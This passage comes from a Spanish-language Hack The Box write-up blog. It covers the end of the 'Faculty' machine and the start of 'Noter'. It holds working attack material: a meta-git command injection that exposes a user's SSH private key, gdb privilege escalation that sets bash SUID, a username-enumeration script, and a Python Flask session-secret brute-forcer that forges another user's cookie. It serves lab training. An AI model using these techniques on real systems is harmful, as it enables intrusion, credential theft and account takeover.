4.67GB Users logged in: 0 Memory usage: 35% IPv4 address for eth0: 10.10.11.169 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsYou have mail.Last login: Fri Aug 5 20:19:01 2022 from 10.10.14.76gbyolo@faculty:~$ whoamigbyologbyolo@faculty:~$ find / -name user.txt 2&amp;gt;/dev/null | ls -ltotal 0Empezamos una enumeración básica del sistema y encontramos en la ruta /var/mail un mensaje del usuario developer para gbyolo que nos dice que ahora podemos administrar los repositorios git de la facultadgbyolo@faculty:/$ cat /var/mail/gbyolo From developer@faculty.htb Tue Nov 10 15:03:02 2020Return-Path: &amp;lt;developer@faculty.htb&amp;gt;X-Original-To: gbyolo@faculty.htbDelivered-To: gbyolo@faculty.htbReceived: by faculty.htb (Postfix, from userid 1001) id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)Subject: Faculty groupTo: &amp;lt;gbyolo@faculty.htb&amp;gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &amp;lt;20201110140302.0399E26125A@faculty.htb&amp;gt;Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)From: developer@faculty.htbX-IMAPbase: 1605016995 2Status: OX-UID: 1Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\\ndeveloper@faculty.htbPara esto podemos ver que aplicaciones o comandos podemos ejecutar y que privilegios tenemos, para ello usamos el comando sudo -l e ingresamos nuestra contraseña (la de la conexión ssh):gbyolo@faculty:~$ sudo -l[sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser gbyolo may run the following commands on faculty: (developer) /usr/local/bin/meta-gitEncontramos que podemos ejecutar el comando meta-git como el usuario developer, por el nombre podemos decir que es un control de versiones al igual que gitInvestigando primero encontramos que meta es una herramienta para administrar sistemas y bibliotecas de múltiples proyectos y que meta-git es un plugin que permite administrar estos repositorios meta Por si necesitas mas información sobre qué es meta y meta-gitExecutando el programa nos muestra todas las opciones que tenemos disponibles:gbyolo@faculty:~$ /usr/local/bin/meta-gitUsage: meta-git [options] [command]Options: -h, --help output usage informationCommands: add Add file contents to the index branch List, create, or delete branches checkout Switch branches or restore working tree files clean Remove untracked files from the working tree clone Clone meta and child repositories into new directories commit Record changes to the repository diff Show changes between commits, commit and working tree, etc fetch Download objects and refs from another repository merge Join two or more development histories together pull Fetch from and integrate with another repository or a local branch push Update remote refs along with associated objects remote Manage set of tracked repositories status Show the working tree status tag Create, list, delete or verify a tag object signed with GPG update Clone any repos that exist in your .meta file but aren&#39;t cloned locally help [cmd] display help for [cmd]A pesar que no podemos ver la versión del programa en el panel de ayuda, ya que es una aplicación hecha en javascript y necesita instalarse con npm (sistema de gestión de paquetes). Entonces al momento de instalar este paquete/plugin se crea un directorio /node-modules en la carpeta raíz de nuestro proyecto /usr/local/lib/node_modules/meta-git y en está carpeta encontramos el archivo package.json donde se almacenan todos los nombres y versiones de los paquetes que depende, con ello encontramos las version de meta-git:gbyolo@faculty:/$ find / -name meta-git 2&amp;gt;/dev/null [65/65]/usr/local/lib/node_modules/meta-git /usr/local/lib/node_modules/meta-git/bin/meta-git /usr/local/bin/meta-git gbyolo@faculty:/$ cd /usr/local/lib/node_modules/meta-gitgbyolo@faculty:/usr/local/lib/node_modules/meta-git$ ls README.md __tests__ bin commitlint.config.js index.js jest.json lib node_modules package.jsongbyolo@faculty:/usr/local/lib/node_modules/meta-git$ cat package.json { &quot;_from&quot;: &quot;meta-git@1.1.2&quot;, &quot;_id&quot;: &quot;meta-git@1.1.2&quot;, &quot;_inBundle&quot;: false, &quot;_integrity&quot;: &quot;sha512-HMoLDeIgVBAl8/neDKX3RfRV4CAiRrrMxqCGmo1eyRS33cxYqIWVr9RS87m5mYnVgLHN8JmsahkpOdbKr3M4Ew==&quot;, &quot;_location&quot;: &quot;/meta-git&quot;, &quot;_phantomChildren&quot;: {}, &quot;_requested&quot;: { &quot;type&quot;: &quot;version&quot;, &quot;registry&quot;: true, &quot;raw&quot;: &quot;meta-git@1.1.2&quot;, &quot;name&quot;: &quot;meta-git&quot;, &quot;escapedName&quot;: &quot;meta-git&quot;, &quot;rawSpec&quot;: &quot;1.1.2&quot;, &quot;saveSpec&quot;: null, &quot;fetchSpec&quot;: &quot;1.1.2&quot; //... }, &quot;version&quot;: &quot;1.1.2&quot; &amp;lt;------- Here!}Con la versión correcta encontramos una vulnerabilidad: Reporte de la vulnerabilidad https://hackerone.com/reports/728040En resumen, lo que ocurre es que al ejecutar el comando meta-git clone &amp;lt;repository_name&amp;gt; el input del usuario &amp;lt;repository_name&amp;gt; se asigna dentro de una cadena sin sanitizar que luego se ejecuta como un comando: Parte del código del problema//...exec( { cmd: `git clone ${meta.projects[name]} ${name}`, &amp;lt;--------- Problem! displayDir: path.resolve(name), }, next);//... Aquí encuentras el código completo https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49Ahora solo queda explotar la vulnerabilidad. Primero tengamos en cuenta que tenemos que ejecutar meta-git como el usuario developer, para ello usamos el comando sudo -u &amp;lt;user&amp;gt; junto a /usr/local/bin/meta-git clone &#39;&amp;lt;user_input&amp;gt;&#39;, donde nuestro &amp;lt;user_input&amp;gt; será cualquier nombre ya que no tenemos un repositorio actual y haremos uso de el operador lógico || el cúal funciona como un or y al momento que falle la llamada al repositorio inexistente pasará a ejecutar el comando que insertemos luego:gbyolo@faculty:/$ sudo -u developer /usr/local/bin/meta-git clone &#39;any text || whoami&#39;meta git cloning into &#39;any text || whoami&#39; at any text || whoamiany text || whoami:fatal: repository &#39;any&#39; does not existwhoami: extra operand ‘any’Try &#39;whoami --help&#39; for more information.developer &amp;lt;---------------------------------------- Remote Code Executionany text || whoami ✓(node:38044) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir &#39;/any text || whoami&#39; at process.chdir (internal/process/main_thread_only.js:31:12) at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11) at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22) at process._tickCallback (internal/process/next_tick.js:68:7) at Function.Module.runMain (internal/modules/cjs/loader.js:834:11) at startup (internal/bootstrap/node.js:283:19) at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)(node:38044) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)(node:38044) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.Solo queda obtener la llave privada id_rsa del usuario developer para entrar por SSH y conseguir la flag:gbyolo@faculty:/$ sudo -u developer /usr/local/bin/meta-git clone &#39;any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 &amp;amp;&amp;amp; foo&#39;meta git cloning into &#39;any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 &amp;amp;&amp;amp; foo&#39; at .ssh 1234 &amp;amp;&amp;amp; foo.ssh 1234 &amp;amp;&amp;amp; foo:fatal: repository &#39;any&#39; does not existServing HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...10.10.14.76 - - [06/Aug/2022 01:28:22] &quot;GET /id_rsa HTTP/1.1&quot; 200 - ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ wget -q http://10.10.11.169:1234/id_rsa❯ chmod 600 id_rsa❯ ssh -i id_rsa developer@10.10.11.169Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)...Last login: Sat Aug 6 01:28:59 2022 from 10.10.14.76developer@faculty:~$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root developer 33 Aug 5 06:54 /home/developer/user.txt Tienes agregar al final del comando una coma ; ó (|| y &amp;amp;&amp;amp; seguidos por cualquier expresión), todo con el fin que valide el comando completo y no ocurran erroresPrivilege EscalationComo el usuario developer somos parte del grupo debug, entonces buscamos archivos que formen parte de este grupo y encontramos la aplicación/binario gdb:developer@faculty:~$ find / -group debug 2&amp;gt;/dev/null | xargs ls -l-rwxr-x--- 1 root debug 8440200 Dec 8 2021 /usr/bin/gdbVemos que podemos usar el depurador gdb:También con gdb podemos enlazarnos a un cierto proceso con gdb -p &amp;lt;process_pid&amp;gt;, examinar su código y también usar las librerías de los programas que son parte del proceso. Además si ese proceso es ejecutado como un usuario privilegiado, está claro que tendremos sus privilegios Primero debemos encontrar procesos que ejecute el usuario rootdeveloper@faculty:~$ ps aux | grep rootUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND...root 615 0.0 0.0 0 0 ? I&amp;lt; Aug05 0:00 [kaluad]root 616 0.0 0.0 0 0 ? I&amp;lt; Aug05 0:00 [kmpath_rdacd]root 617 0.0 0.0 0 0 ? I&amp;lt; Aug05 0:00 [kmpathd]root 618 0.0 0.0 0 0 ? I&amp;lt; Aug05 0:00 [kmpath_handlerd]root 619 0.0 0.8 214604 17952 ? SLsl Aug05 0:07 /sbin/multipathd -d -sroot 664 0.0 0.5 46324 10760 ? Ss Aug05 0:00 /usr/bin/VGAuthServiceroot 670 0.1 0.4 310256 8136 ? Ssl Aug05 1:19 /usr/bin/vmtoolsdroot 671 0.0 0.2 99896 5892 ? Ssl Aug05 0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0root 695 0.0 0.4 238080 9176 ? Ssl Aug05 0:01 /usr/lib/accountsservice/accounts-daemonroot 723 0.0 0.1 81956 3672 ? Ssl Aug05 0:03 /usr/sbin/irqbalance --foregroundroot 724 0.0 0.8 26896 17880 ? Ss Aug05 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers &amp;lt;-------- Interestingroot 729 0.0 0.4 236436 8988 ? Ssl Aug05 0:00 /usr/lib/policykit-1/polkitd --no-debugroot 740 0.0 0.3 17472 7152 ? Ss Aug05 0:01 /lib/systemd/systemd-logindroot 741 0.0 0.6 395512 13696 ? Ssl Aug05 0:00 /usr/lib/udisks2/udisksdroot 785 0.0 0.6 318816 13520 ? Ssl Aug05 0:00 /usr/sbin/ModemManagerroot 912 0.0 0.1 5568 2964 ? Ss Aug05 0:00 /usr/sbin/cron -froot 913 0.0 0.8 194680 16848 ? Ss Aug05 0:04 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)root 920 0.0 0.1 7248 3172 ? S Aug05 0:00 /usr/sbin/CRON -froot 925 0.0 0.0 55276 1540 ? Ss Aug05 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;root 927 0.0 0.0 2608 528 ? Ss Aug05 0:00 /bin/sh -c bash /root/service_check.sh root 929 0.0 0.1 5648 2944 ? S Aug05 0:06 bash /root/service_check.sh... Luego nos enlazamos con gdb y el respectivo PID del procesodeveloper@faculty:~$ gdb -p 724 GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot; and &quot;show warranty&quot; for details. This GDB was configured as &quot;x86_64-linux-gnu&quot;. Type &quot;show configuration&quot; for configuration details. For bug reporting instructions, please see: &amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;. Find the GDB manual and other documentation resources online at: &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;. For help, type &quot;help&quot;. Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;. Attaching to process 724 Reading symbols from /usr/bin/python3.8... (No debugging symbols found in /usr/bin/python3.8) Reading symbols from /lib/x86_64-linux-gnu/libc.so.6... --Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging-- Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug......Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)0x00007f60d12c3967 in __GI___poll (fds=0xbd2a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:2929 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.(gdb)Al ejecutar observamos que se leen diversas librerias de los programas que forman parte en el proceso. Entonces usando el comando info function &amp;lt;reg_expresion&amp;gt; podemos buscar las funciones disponibles del programa en cuestión: Buscamos funciones con la expresion system con el propósito de poder ejecutar comandos(gdb) info function systemAll functions matching regular expression &quot;system&quot;:File ../sysdeps/posix/system.c: &amp;lt;------------------------- C file!197: int __libc_system(const char *);102: static int do_system(const char *);File pt-system.c:38: static int system_compat(const char *);File svc.c:309: void __GI_svcerr_systemerr(SVCXPRT *);Non-debugging symbols:0x0000000000425530 system@plt0x00007f60d0a42180 g_mem_is_system_malloc0x00007f60d0a73d60 g_get_system_data_dirs...Buscando el archivo con su ruta relativa, encontramos que es una librería estándar de C que nos permite ejecutar subprocesos o comandos en el Sistema Operativo. Además pertenece a Glibc que es una librería central del sistema en C y es esencial en la mayoría de programas Entonces llamamos a la función system con el comando call system(&quot;&amp;lt;command&amp;gt;&quot;)(gdb) call system(&quot;chmod u+s /bin/bash&quot;)[Detaching after vfork from child process 42640]$4 = 0 &amp;lt;--------- successful process(gdb) call system(&quot;wrong command&quot;)[Detaching after vfork from child process 42653]$5 = 32512 &amp;lt;--------- unsuccessful processSolo asignamos a la bash permisos SUID para poder ejecutarlo como el propietario (root) Por último usamos el comando shell para obtener una consola, usamos bash -p para ejecutar la bash como el propietario y ser root(gdb) shellbash-5.0$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bashbash-5.0$ bash -pbash-5.0# whoamirootbash-5.0# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Aug 5 06:54 /root/root.txt" }, { "title": "Hackthebox Writeup Noter", "url": "/posts/HTBNoter/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Python Scripting, Bash Scripting, Flask, Information Leakage, CVE-2021-23639, MySQL, backups, User validation", "date": "2022-07-16 04:08:17 -0500", "snippet": "Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Remote code execution CVE-2021-23639 (foothold). MySQL running like root User-Defined function to RCE) (privilege escalation). OS IP Release Date Difficulty Points Linux 10.10.11.160 07 May 2022 Medium 30 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.160PING 10.10.11.160 (10.10.11.160) 56(84) bytes of data.64 bytes from 10.10.11.160: icmp_seq=1 ttl=63 time=108 ms \\______________________ Linux Machine--- 10.10.11.160 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 106.937/106.937/106.937/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.160Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 16:20 -05Nmap scan report for 10.10.11.160Host is up (0.11s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp \\___________ File Transfer Protocol22/tcp open ssh \\___________ Secure Shell Protocol5000/tcp open upnp \\___________ Universal Plug and Play Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora realizamos un escaneo a profundidad de los puertos 21(FTP) - 22(SSH) - 5000(UPNP):❯ nmap -p21,22,5000 -sCV 10.10.11.160 -oN targetTCPStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 16:26 -05Nmap scan report for 10.10.11.160Host is up (0.11s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: Noter|_http-server-header: Werkzeug/2.0.2 Python/3.8.10Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapEmpezamos por el puerto 21(FTP) intentando logearnos con el método Anonymous FTP pero no logramos nada. Por otro lado, ya que no disponemos de credenciales válidas omitimos el puerto 22(SSH)Algo importante con el escaneo de nmap es que logramos visualizar la versión de cada servicio y con ello podemos darnos una idea a que distribución de Linux nos estaríamos enfrentando. Por ejemplo, al buscar en internet la versión OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 seguido de launchpad (plataforma opensource que proporciona source code hosting entre otras funciones) y con ellos logramos ver que podriamos estar frente a un máquina de distro Ubuntu con el codename o release FocalSolo nos queda escanear el puerto 5000(UPNP) que ahora lo detecta como servicio (HTTP) y con ello buscamos sus tecnologías: Usando whatweb❯ whatweb http://10.10.11.160:5000http://10.10.11.160:5000 [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter], Werkzeug[2.0.2] Si quieres una opción gráfica puedes usar en tu navegador la extensión Wappalyzer y ver las tecnologíasEs importante comentar que probemos diferentes herramientas y así confirmar nuestros resultados como también encontrar nueva información: Usando webtech❯ webtech -u http://10.10.11.160:5000 --json | jq{ &quot;http://10.10.11.160:5000&quot;: { &quot;tech&quot;: [ { &quot;name&quot;: &quot;Python&quot;, &quot;version&quot;: &quot;3.8.10&quot; }, { &quot;name&quot;: &quot;Bootstrap&quot;, &quot;version&quot;: &quot;3.3.7&quot; }, { &quot;name&quot;: &quot;Flask&quot;, &amp;lt;---------- New information &quot;version&quot;: &quot;2.0.2&quot; } ], &quot;headers&quot;: [] }} Puedes instala la herramienta de python : pip install webtechObservamos muchas tecnologías asociadas al lenguaje Python, así que ya podemos tener una idea. Si fuera el caso que no encontramos el uso del microframework Flask, podemos deducir de su uso ya que por defecto Flask usa el puerto 5000 para lanzar el servidor de tu aplicación webSiguiendo con la fase de reconocimiento pasemos a ver la interfaz de la web: Ingresando con FirefoxDe primeras observamos una aplicación para poder tomar notas. Ya que podemos logearnos intentamos usar credenciales por defecto (admin:admin, administrator:administrator, guest:guest). Solo logramos observar un mensaje de credenciales inválidas:Estos mensajes son importantes y podemos tomar la ventaja de validar usuarios respecto al mensaje que vemos en pantalla. Por ejemplo, nos creamos un usuario y escribimos una contraseña incorrecta para ver como responde la web:Ojito, podemos llegar a la conlusión que podemos validar usuarios en la aplicación respecto al mensaje de error. Entonces procedemos a “Fuzzear” posibles usuarios: Usando un script en bash❯ cat enumerate_users.sh#!/bin/bashlist=$(locate xato-net-10-million-usernames-dup.txt)while read -r user; do response=$(curl -si -d &quot;username=$user&amp;amp;password=dadaada&quot; -i http://10.10.11.160:5000/login | grep Invalid | awk -F&quot;&amp;gt;&quot; &#39;{print $2}&#39; | awk -F&quot;&amp;lt;&quot; &#39;{print $1}&#39;) if [[ $response == &quot;Invalid login&quot; ]]; then echo $user &quot;:&quot; $response fi;done &amp;lt; $list; wait❯ bash ./enumerate_users.shblue : Invalid login &amp;lt;-------- Found user! Puedes encontrar el pequeño script en mi repositorio: https://github.com/E1P0TR0 Con la herramienta wfuzz❯ wfuzz -c -t 50 -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -d &#39;username=FUZZ&amp;amp;password=badpassword&#39; --ss &#39;Invalid login&#39; http://10.10.11.160:5000/login /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.160:5000/loginTotal requests: 624370=====================================================================ID Response Lines Word Chars Payload =====================================================================000000113: 200 68 L 110 W 2033 Ch &quot;blue&quot; &amp;lt;------- Found user!Ambos casos encontramos al usuario blue, así que lo tenemos en cuenta para mas adelante. Ahora veamos el funcionamiento de la aplicación webEn resumen, podemos agregar, almacenar, editar y ver nuestras notas. Además al agregar una nota o ver en la herramienta Wappalyzer encontramos el uso de la tecnología CKEditor 4.6.2 (editor de texto para páginas web)A pesar de saber la versión y sus respectivas vulnerabilidades, solo encontramos un XSS Attack en el tag html &amp;lt;textarea&amp;gt; al agregar contenido a una nota a pesar que se aplique ACF (Advanced Content Filter):Después de mucha búsqueda no logre aprovecharme de esta posible brecha, en tal caso puede ser un Rabbit Hole, el cuál podemos tomarlo como una situación donde no llegaremos a algo en concreto y solo perderemos tiempo.Mirando para otra dirección, ya que tenemos una cuenta, es probable que tengamos una Cookie de sesión. Para ver esta cookie podemos presionar las teclas Ctrl+Shift+I ó F12 (pestaña storage):Observando el formato parece un JWT (Json Web Token). Sin embargo, averiguando más y sabiendo las tecnologías que se usan, llegamos a la conlusión que se trata de Flask’s Session Management. En resumen, Flask por defecto usa “cookies firmadas” para almacenar la información de la sesión de un cliente en la aplicación. A pesar que no están encriptadas (solo codificadas en base64), están firmadas con una secret key, y tienen el siguiente formato: Session data : La data actual de la sesión Timestamp : Avisa al servidor la última vez que la data fue actualizada (puede ser el la hora actual) Cryptographic hash : Hash calculado con tu data, el timestamp y la “secret key” del servidorEn nuestro caso tenemos el siguiente payload:❯ echo eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFyc3MifQ.YtNqqg.zx1mPLX7-d2VQgWsQzx8K78zBgc | base64 -d | jqbase64: invalid input{ &quot;logged_in&quot;: true, &quot;username&quot;: &quot;marss&quot;}Con toda la información obtenida y sabiendo que tenemos el nombre de un usuario válido blue, solo tenemos que encontrar la correcta “secret key” para poder generar su respectiva cookie y obtener su sesiónFootholdBuscando en internet encotramos que existe una herramienta llamada flask-unsign que nos automatiza todo el proceso hallando la secret key y generando una nueva con el payload que especifiquemos Aquí puede encontrar la herramienta flask-unsign: https://pypi.org/project/flask-unsign/Por gusto propio y a manera de aprender y entender cuál es el proceso para obtener esa preciada secret key, hice un scrip en python en el cuál le pasas la cookie y el nuevo payload que deseas insertar para que por Brute force consiga la secret key y la nueva cookie:import sys, signal, argparse, json, time, hashlibfrom pwn import *from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignaturefrom flask.json.tag import TaggedJSONSerializer# ctrl + cdef signal_handler(signum, frame): log.failure(&quot;Interruption&quot;); sys.exit()signal.signal(signal.SIGINT, signal_handler)# argumentsparser = argparse.ArgumentParser(description=&#39;Brute force attack &quot;Secret key&quot; of a Flask session cookie by default&#39;)parser.add_argument(&#39;-cookie&#39;, type=str, required=True, help=&#39;session cookie to crack&#39;)parser.add_argument(&#39;-payload&#39;, type=str, required=True, help=&quot;&quot;&quot;new payload to create a valid session cookie ( &#39;{&quot;key&quot;:&quot;value&quot;}&#39; )&quot;&quot;&quot;)args = parser.parse_args()# create wordlistdef load_wordlist(): with open(&#39;all.txt&#39;, &#39;r&#39;) as file: wordlist = file.readlines() return wordlist# bruteforce cookiedef bruteforce_cookie(wordlist): p = log.progress(&#39;Starting Brute force attack&#39;) time.sleep(1) for secret in wordlist: secret = secret.strip(&#39;\\n&#39;) p.status(&#39;{}&#39;.format(secret)) try: serializer = URLSafeTimedSerializer( secret_key=secret, salt=&#39;cookie-session&#39;, serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ &#39;key_derivation&#39; : &#39;hmac&#39;, &#39;digest_method&#39; : hashlib.sha1 } ).loads(args.cookie) log.info(&#39;Payload : {}&#39;.format(serializer)) except BadSignature: continue log.success(&quot;Secret key : {}&quot;.format(secret)) return secret# craft cookiedef create_cookie(secret_key): time.sleep(1) p = log.progress(&#39;Creating new cookie with the payload&#39;) p.status(args.payload) try: serializer = URLSafeTimedSerializer( secret_key=secret_key, salt=&#39;cookie-session&#39;, serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ &#39;key_derivation&#39;:&#39;hmac&#39;, &#39;digest_method&#39;: hashlib.sha1 } ).dumps(json.loads(args.payload)) log.success(&#39;Cookie : {}&#39;.format(serializer)) except Exception as e: p.failure(&#39;{} ocurred&#39;.format(e))if __name__ == &#39;__main__&#39;: key = bruteforce_cookie(load_wordlist()) create_cookie(key)# References#---------------------------------------------------#https://github.com/Paradoxis/Flask-Unsign#https://github.com/Paradoxis/Flask-Unsign-Wordlist Puedes encontrar el script y dependencias en mi repositorio: https://github.com/E1P0TR0Ahora solo le pasamos los respectivos parámetros y logramos obtener la cookie del usuario blue:❯ python3 brute_force_cookie.py -husage: brute_force_cookie.py [-h] -cookie COOKIE -payload PAYLOADBrute force attack &quot;Secret key&quot; of a Flask session cookie by defaultoptional arguments: -h, --help show this help message and exit -cookie COOKIE session cookie to crack -payload PAYLOAD new payload to create a valid session cookie ( &#39;{&quot;key&quot;:&quot;value&quot;}&#39; )❯ python3 brute_force_cookie.py -cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFyc3MifQ.YtOJZw.Fy6nzvuXjW_P69IauxCp1WuHZbU -payload &#39;{&quot;logged_in&quot;:true,&quot;username&quot;:&quot;blue&quot;}&#39;[↑] Starting Brute force attack: ********[*] Payload : {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;marss&#39;}[+] Secret key : ********[.] Creating new cookie with the payload: {&quot;logged_in&quot;:true,&quot;username&quot;:&quot;blue&quot;}[+] Cookie : eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtOJ7g.ArNZWl3Agmq5rPAt4QJAz6ybBIsAhora solo copiamos la nueva cookie en la pestaña de storage de las herramientas de desarrollador (como vimos anteriormente), actualizamos y ya estaremos en la sesión del usuario blue:Empezamos a inspeccionar y en Dashboard encontramos una nota con un acordatorio de cosas que hacer antes del fin de semana, y en ella dice Delete the password file, pero a que se refiere?, sigamos buscandoEn la sección de notas encontramos una de agradecimiento de parte del usuario ftp_admin hacia nuestro usuario por adquirir la membresía premium y con ello el acceso a su servicio FTP, además de sus respectivas credenciales.Sin pensarlo nos dirigimos al puerto 21(FTP) que obtuvimos en nuestro escaneo y entramos con las credenciales:❯ ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:potro): blue331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||24962|)150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files-rw-r--r-- 1 1002 1002 12569 Dec 24 2021 policy.pdf226 Directory send OK.ftp&amp;gt; get policy.pdflocal: policy.pdf remote: policy.pdf229 Entering Extended Passive Mode (|||54826|)150 Opening BINARY mode data connection for policy.pdf (12569 bytes).100% |*****************************************************************************************************| 12569 2.59 MiB/s 00:00 ETA226 Transfer complete.12569 bytes received in 00:00 (108.48 KiB/s)ftp&amp;gt; exit221 Goodbye.Logramos encontrar un archivo policy.pdf, así que lo descargamos con el comando get &amp;lt;file_name&amp;gt; a nuestra máquina para examinarlo y encontramos, como dice su nombre, La políticas de contraseña de la aplicación NoterDespués de la lectura destacamos el siguiente enunciado:Observamos que el usuario blue mantiene el nombre y contraseña con el formato por defecto. Entonces, si logramos entrar entrar con esas credenciales al servicio FTP, y además ya que encontramos al usuario administrador del servicio FTP de la aplicación Noter ftp_admin, es tan descuidado de no haber cambiado su contraseña?❯ ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:potro): ftp_admin331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||60125|)150 Here comes the directory listing.-rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip-rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip226 Directory send OK.ftp&amp;gt; mget *mget 